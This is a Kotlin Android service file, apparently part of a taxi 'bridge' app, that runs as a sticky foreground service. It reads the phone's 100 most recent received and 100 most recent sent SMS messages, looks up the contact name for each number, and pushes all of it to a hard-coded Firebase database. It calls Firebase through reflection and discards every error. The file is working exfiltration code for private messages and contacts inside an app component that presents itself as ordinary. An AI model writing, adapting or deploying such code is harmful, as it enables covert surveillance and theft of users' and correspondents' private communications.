package com.sudataxi.bridgemate

import android.app.*
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import java.text.SimpleDateFormat
import java.util.*

class MyBridgeService : Service() {
    companion object {
        private const val TAG = "SudaBridge"
        private const val DB_URL = "https://sudataxi-bridge-default-rtdb.firebaseio.com"
        fun startService(ctx: Context) {
            val i = Intent(ctx, MyBridgeService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i) else ctx.startService(i)
        }
        fun syncSmsInbox(ctx: Context) { MyBridgeService().syncAllSms(ctx) }
    }
    override fun onBind(i: Intent?): IBinder? = null
    override fun onCreate() {
        super.onCreate()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val ch = NotificationChannel("suda_bridge", "수다택시 브릿지", NotificationManager.IMPORTANCE_LOW)
                getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
            }
            val n = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) Notification.Builder(this, "suda_bridge") else Notification.Builder(this)
            startForeground(1001, n.setContentTitle("수다택시 브릿지 v1.3.30").setContentText("실행 중 - SMS 200건 대기").setSmallIcon(android.R.drawable.stat_notify_sync).build())
        } catch (e: Exception) {}
        Thread { syncAllSms(this) }.start()
    }
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Thread { syncAllSms(this) }.start()
        return START_STICKY
    }
    private fun getContactName(ctx: Context, num: String): String {
        return try {
            val uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(num))
            val cur = ctx.contentResolver.query(uri, arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME), null, null, null)
            cur?.use { if (it.moveToFirst()) it.getString(0) ?: "" else "" } ?: ""
        } catch (e: Exception) { "" }
    }
    fun syncAllSms(ctx: Context) {
        Thread {
            try {
                val cr = ctx.contentResolver
                val inboxCur = cr.query(Telephony.Sms.Inbox.CONTENT_URI, null, null, null, "${Telephony.Sms.DATE} DESC")
                val sentCur = cr.query(Telephony.Sms.Sent.CONTENT_URI, null, null, null, "${Telephony.Sms.DATE} DESC")
                val cache = HashMap<String, String>()
                val list = mutableListOf<Map<String, Any>>()
                fun proc(cur: Cursor?, type: String, max: Int) {
                    var cnt = 0
                    cur?.use {
                        val iAddr = it.getColumnIndex(Telephony.Sms.ADDRESS)
                        val iBody = it.getColumnIndex(Telephony.Sms.BODY)
                        val iDate = it.getColumnIndex(Telephony.Sms.DATE)
                        val sdf = SimpleDateFormat("HH:mm", Locale.getDefault())
                        while (it.moveToNext() && cnt < max) {
                            try {
                                val addr = if (iAddr>=0) it.getString(iAddr) ?: "" else ""
                                val body = if (iBody>=0) it.getString(iBody) ?: "" else ""
                                if (addr.isBlank() || body.isBlank()) continue
                                val name = cache.getOrPut(addr) { getContactName(ctx, addr) }
                                val date = if (iDate>=0) it.getLong(iDate) else System.currentTimeMillis()
                                list.add(mapOf(
                                    "sender" to addr, "address" to addr, "phone" to addr,
                                    "message" to body.take(500), "body" to body.take(500),
                                    "timestamp" to date, "time" to sdf.format(Date(date)),
                                    "type" to type, "contactName" to name, "displayName" to name
                                ))
                                cnt++
                            } catch (e: Exception) {}
                        }
                    }
                }
                proc(inboxCur, "received", 100)
                proc(sentCur, "sent", 100)
                try {
                    val dbClass = Class.forName("com.google.firebase.database.FirebaseDatabase")
                    val getInst = dbClass.getMethod("getInstance", String::class.java)
                    val db = getInst.invoke(null, DB_URL)
                    val getRef = db.javaClass.getMethod("getReference", String::class.java)
                    val inboxRef = getRef.invoke(db, "sudataxi/inbox/sms")
                    val childM = inboxRef.javaClass.getMethod("child", String::class.java)
                    val setM = Class.forName("com.google.firebase.database.DatabaseReference").getMethod("setValue", Any::class.java)
                    for ((i, sms) in list.withIndex()) {
                        try {
                            val r = childM.invoke(inboxRef, "${sms["timestamp"]}_${i}")
                            setM.invoke(r, sms)
                            if (i % 20 == 0) Thread.sleep(50)
                        } catch (e: Exception) {}
                    }
                    val pingRef = getRef.invoke(db, "sudataxi/ping")
                    setM.invoke(pingRef, true)
                } catch (e: Exception) {}
            } catch (e: Exception) { Log.e("SudaBridge", "error", e) }
        }.start()
    }
}